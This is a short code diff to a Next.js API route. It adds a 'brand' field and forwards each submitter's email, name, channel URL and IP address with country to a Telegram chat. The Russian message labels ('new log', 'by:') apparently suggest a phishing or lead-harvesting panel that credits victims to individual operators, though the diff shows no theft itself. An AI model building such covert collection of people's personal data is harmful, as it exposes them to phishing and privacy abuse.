@@ -103,7 +103,7 @@ export async function POST(request: NextRequest) {
     }
 
     const body = await request.json();
-    const { channelUrl, email, name } = body;
+    const { channelUrl, email, name, brand } = body;
 
     // Validate required fields
     if (!email || !name) {
@@ -173,10 +173,11 @@ export async function POST(request: NextRequest) {
       : "Не указан";
 
     // Format message
-    const message = `📋 *НОВЫЙ ЛОГ*\n\n` +
+    const brandText = brand ? `\n👥 *by:* ${brand}` : "";
+    const message = `📋 *НОВЫЙ ЮЗЕР*\n\n` +
       `🎬 *Канал:* ${channelText}\n` +
       `📧 *Почта:* ${email}\n` +
-      `👤 *Имя:* ${name || "Не указано"}\n` +
+      `👤 *Имя:* ${name || "Не указано"}${brandText}\n` +
       `🌐 *IP:* ${ipWithCountry}`;
 
     // Send message to Telegram
